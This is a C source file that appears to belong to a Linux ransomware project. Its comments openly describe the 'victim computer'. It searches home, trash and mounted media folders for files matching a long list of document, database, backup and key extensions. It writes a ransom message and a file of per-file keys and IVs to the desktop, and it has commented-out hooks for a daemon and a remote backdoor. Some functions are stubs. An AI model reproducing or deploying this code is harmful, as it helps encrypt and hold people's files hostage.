// find files and store in the list
#include"tigress.h"
#include"func.h"
#include"struct.h"
#include"crypto.h"
#include<string.h>
#include<time.h>
#include<stdlib.h>
#include<dirent.h>
#include<unistd.h>
#include<stdio.h>
#include <pwd.h>
#include <sys/stat.h>
#include<openssl/aes.h>
#include<openssl/evp.h>

/**
 * This function will find all files on the victim computer.
 * Starts from the start_path and to each file found, it's extension is verified
 * If the file is valid, then the path to the file is append to the files (List).
 * @param files -> type = List
 * @param start_path -> type =  char * (String)
 */

int main() {return 0;}
void append(List **l, char *file_path, char *key, char *iv) {}
void destroy(List **l) {} 

void find_files(List **files, char* start_path){

    char file_types[] = "doc docx xls xlsx ppt pptx pst ost msg eml vsd vsdx txt csv rtf wks wk1 pdf dwg onetoc2 snt jpeg jpg docb docm dot dotm dotx xlsm xlsb xlw xlt xlm xlc xltx xltm pptm pot pps ppsm ppsx ppam potx potm edb hwp 602 sxi sti sldx sldm sldm vdi vmdk vmx gpg aes ARC PAQ bz2 tbk bak tar tgz gz 7z rar zip backup iso vcd bmp png gif raw cgm tif tiff nef psd ai svg djvu m4u m3u mid wma flv 3g2 mkv 3gp mp4 mov avi asf mpeg vob mpg wmv fla swf wav mp3 sh class jar java rb asp php jsp brd sch dch dip pl vb vbs ps1 bat cmd js asm h pas cpp c cs suo sln ldf mdf ibd myi myd frm odb dbf db mdb accdb sql sqlitedb sqlite3 asc lay6 lay mml sxm otg odg uop std sxd otp odp wb2 slk dif stc sxc ots ods 3dm max 3ds uot stw sxw ott odt pem p12 csr crt key pfx der";
    DIR *dir;
    struct dirent *ent;
    char * ext;
    char cp[747];

    if((dir=opendir(start_path)) != NULL){

        while((ent = readdir(dir)) != NULL){

            strcpy(cp, file_types);
            if(ent->d_type == 8){ // it's a file

                char *path_to_file = (char *)malloc(sizeof(char) *(strlen(start_path) + strlen(ent->d_name) + 2));
                strcpy(path_to_file, start_path);
                strcat(path_to_file, ent->d_name);
                ext = strtok(cp, " ");

                while(ext != NULL){

                    if(strcmp(get_filename_ext(path_to_file), ext) == 0){
                        append(files, path_to_file, NULL, NULL);
                        break;
                    }
                    ext = strtok(NULL, " ");
                }

            }else if(ent->d_type == 4){ // it's a directory

                if(!(strcmp(ent->d_name, "..") == 0 || strcmp(ent->d_name, ".") == 0)){

                    char *new_dir = ent->d_name;
                    char *full_path = (char*) malloc(sizeof(char)*(strlen(start_path)+strlen(new_dir) + 2));
                    strcpy(full_path,start_path);
                    strcat(full_path,new_dir);
                    strcat(full_path,"/");
                    find_files(files, full_path);
                    free(full_path);

                }
            }
        }
    }
}

/**
 * This function will save things on the victim desktop
 * such as enc_files.gc, public key, private key.
 * This file will be used to decrypt.
 * @param encrypted -> type = List
 * @param files -> type = List
 */
void create_files_desktop(List *encrypted, List *files, char * desktop){
    save_into_file_encrypted_list(encrypted, desktop);
    save_into_file_files_list(files, desktop);
    //create_decryptor(desktop);
    //create_daemon_process();
    //create_remote_backdoor();
}

/**
 * This function will save the original files path 
 * on the victim desktop
 * @param l -> type = List
 */
void save_into_file_files_list(List *l, char *desktop) {
    // Verificar si la lista o el escritorio son NULL
    if (l == NULL) {
        fprintf(stderr, "Error: la lista es NULL.\n");
        return;
    }

    if (desktop == NULL) {
        fprintf(stderr, "Error: la ruta de escritorio es NULL.\n");
        return;
    }

    FILE *f;
    char *new_file;
    char *line;
    char *string = "Sup brother, all your files below have been encrypted, cheers!\n";

    // Asignación de memoria para new_file
    size_t new_file_size = strlen(desktop) + 27; // +27 para incluir "your_encrypted_files.txt" y el terminador nulo
    new_file = (char *)malloc(sizeof(char) * new_file_size);
    if (new_file == NULL) {
        fprintf(stderr, "Error al asignar memoria para new_file\n");
        return;
    }

    snprintf(new_file, new_file_size, "%syour_encrypted_files.txt", desktop);
    printf("Intentando abrir el archivo: %s\n", new_file);

    // Abrir el archivo y verificar si fopen tuvo éxito
    f = fopen(new_file, "w");
    if (f == NULL) {
        perror("Error al abrir el archivo");
	fprintf(stderr, "Ruta del archivo: %s\n", new_file);
        free(new_file); // Liberar memoria antes de salir
        return;
    }

    // Escribir la cadena inicial
    fwrite(string, strlen(string), 1, f);

    // Iterar sobre la lista y escribir cada elemento
    while (l != NULL) {
        // Asegurarse de que l->info[2] no sea NULL
        if (l->info != NULL && l->info[2] != NULL) {
            size_t line_size = strlen(l->info[2]) + 2; // +2 para el '\n' y el '\0'
            line = (char *)malloc(sizeof(char) * line_size);
            if (line == NULL) {
                fprintf(stderr, "Error al asignar memoria para line\n");
                break; // Salir del bucle si hay un error de asignación
            }

            snprintf(line, line_size, "%s\n", l->info[2]);
            fwrite(line, strlen(line), 1, f);
            free(line); // Liberar memoria dentro del ciclo
        } else {
            fprintf(stderr, "Advertencia: l->info o l->info[2] es NULL, se omite este elemento.\n");
        }

        l = l->prox; // Siguiente elemento de la lista
    }

    // Liberar memoria y cerrar el archivo
    free(new_file);
    fclose(f);
}



/**
 * This function will save all keys, iv's and path's from each successfull
 * encrypted file in the file named: "enc_files.gc" on the user's desktop.
 * This file will be used to decrypt.
 * @param l -> type = EncList
 */
void save_into_file_encrypted_list(List *l, char * desktop){
    FILE *f;
    char * new_file;
    char *line;
    
    if(l == NULL){
        return;
    }

    new_file = (char*)malloc(sizeof(char)*(strlen(desktop) + 13));
    strcpy(new_file, desktop);
    strcat(new_file, "enc_files.gc");

    f = fopen(new_file, "w");

    while(l != NULL){
        line = malloc((sizeof(char)*strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11));
        strcpy(line, l->info[0]);
        strcat(line, ":");
        strcat(line, l->info[1]);
        strcat(line, ":");
        strcat(line, l->info[2]);
        strcat(line, "\n");
        fwrite(line, strlen(line), 1, f);
        memset(line, 0, strlen(line));
        l = l->prox;
    }
    free(line);
    free(new_file);
    fclose(f);
}

/**
 * This function will open the file "enc_files.gc" that contains the key, iv
 * and path from each successfull encrypted file on the machine
 * Is used to append to the list all the encrypted files.
 * This list will be used to decrypt the files.
 * @param l -> type = List
 */
void read_from_file_encrypted_files(List **l, char * desktop){
    FILE *f;
    int status;
    char *key, *iv, *path, *line;
    char *token;
    size_t len = 0;
    ssize_t read;

    char * new_file = (char *)malloc((sizeof(char) * strlen(desktop) + 13));
    strcpy(new_file, desktop);
    strcat(new_file, "enc_files.gc");

    key = (char *)malloc(sizeof(char) *33);
    iv = (char *)malloc(sizeof(char) * 17);


    f = fopen(new_file, "r");

    if(f != NULL){
        if(*l == NULL){
            /*Still need to figure if the file is encrypted RSA1024*/
            while ((getline(&line, &len, f)) != -1) {

                token = strtok(line, ":");
                strcpy(key, token);
                token = strtok(NULL, ":");
                strcpy(iv, token);
                token = strtok(NULL, ":");
                path = (char *)malloc(sizeof(char) * (strlen(token) + 2));
                strcpy(path, token);

                append(l, path, key, iv);
                memset(key, 0, strlen(key));
                memset(iv, 0, strlen(iv));
                free(path);
            }

            fclose(f);
            free(new_file);
            free(key);
            free(iv);
            free(line);


        }else if(*l != NULL){
            destroy(l);
        }

    }else{
        printf("Arquivos ainda não foram criptografados\n");
    }
}

/**
 * This function will get the extension from the file path.
 * @param filename -> type = char * (String)
 * @return -> type = char * (String)
 */
const char *get_filename_ext(const char *filename) {

    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;

}

/**
 * This function returns the start path from the computer
 * /home/ + active user/
 * @return -> type = char * (String)
 */
char * get_home_enviroment(){
    struct passwd *pw;
    char * home;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
    strcpy(home, pw->pw_dir);
    strcat(home, "/");
    return home;
}

/**
 * This function return the logged username
 * @return -> type = char * (String)
 */
char * get_username(){
    struct passwd *pw;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    return pw->pw_name;
}

/**
 * This function get the thrash path
 * @param start_path
 * @return
 */
char * get_trash_path(char * home){
    char *trash ;
    trash = (char *)malloc((sizeof(char)* strlen(home) + 21));
    memset(trash, 0, strlen(trash));
    strcpy(trash, home);
    strcat(trash , ".local/share/Trash/");
    return trash;
}

/**
 * This function get the path to the HD/pendrives
 * @param username -> type = char * (String)
 * @return -> type = char * (String)
 */
char * get_media_path(char * username){
    char * path = (char *)malloc((sizeof(char)*strlen(username) + 9));
    strcpy(path, "/media/");
    strcat(path, username);
    strcat(path, "/");
    return path;
}

/**
 * This function get the path to the desktop
 * @param home -> type = char * (String)
 * @return -> type = char * (String)
 */
char * get_desktop_enviroment(char *home){
    char * path = (char *)malloc((sizeof(char)*strlen(home) + 9));
    strcpy(path, home);
    strcat(path, "Desktop/");
    if(is_path(path)){
        return path;
    }

    free(path);
    path = (char *)malloc((sizeof(char)*strlen(home) + 20));
    
    strcpy(path, home);
    strcat(path, "Área de Trabalho/");
    if(is_path(path)){
        return path;
    }
}

char * get_test_path(char * desktop){
    char *path = (char *)malloc((sizeof(char) * strlen(desktop) + 7));
    strcpy(path, desktop);
    strcat(path, "tests/");
    return path;
}

/**
 * This function check if the generated path exists
 * @param home -> type = char * (String)
 * @return -> type = char * (String)
 */
bool is_path(char *path){
    DIR* dir = opendir(path);
    if (dir){
        closedir(dir);
        return true;
    }
    return false;
}

/**
 * This function will generate random string to be saved as key and iv.
 * @param length -> type = integer
 * @return -> type = char * (String)
 */
char* generate_key(int length){
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    char *randomString;
    int key;
    randomString = malloc(sizeof(char) * (length +1));

    if (randomString) {
        for (int n = 0;n < length;n++) {
            key = rand() % (int)(sizeof(charset) -1);
            randomString[n] = charset[key];
        }

        randomString[length] = '\0';
    }


    return randomString;
}
